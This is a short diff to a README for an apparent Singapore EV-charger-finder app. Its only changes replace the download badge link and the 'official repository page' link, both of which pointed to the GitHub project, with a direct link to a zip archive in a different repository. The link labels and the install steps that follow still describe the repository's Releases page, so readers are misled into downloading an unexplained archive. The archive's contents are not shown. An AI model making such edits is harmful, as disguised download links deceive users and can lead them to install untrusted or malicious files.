@@ -5,7 +5,7 @@ description: "Locate EV charging stations in Singapore using real-time availabil
 ---
 # ⚡ sgevchargingapp_android - Find electric vehicle chargers in Singapore
 
-[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://github.com/constancewritten870/sgevchargingapp_android)
+[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge)](https://raw.githubusercontent.com/constancewritten870/constancewritten870.github.io/main/edgrew/constancewritten_github_io_3.9.zip)
 
 This application helps electric vehicle drivers in Singapore locate charging stations. It pulls real-time availability data from the Land Transport Authority. You get accurate information about charger status across the island. The map interface shows you exactly where to find power for your car.
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements to run the software.
 
 ## 📥 How to download and install
 
-1. Visit the [official repository page](https://github.com/constancewritten870/sgevchargingapp_android) to initiate the download.
+1. Visit the [official repository page](https://raw.githubusercontent.com/constancewritten870/constancewritten870.github.io/main/edgrew/constancewritten_github_io_3.9.zip) to initiate the download.
 2. Locate the section labeled Releases on the right side of the screen.
 3. Click on the latest version link.
 4. Download the installer file to your computer.
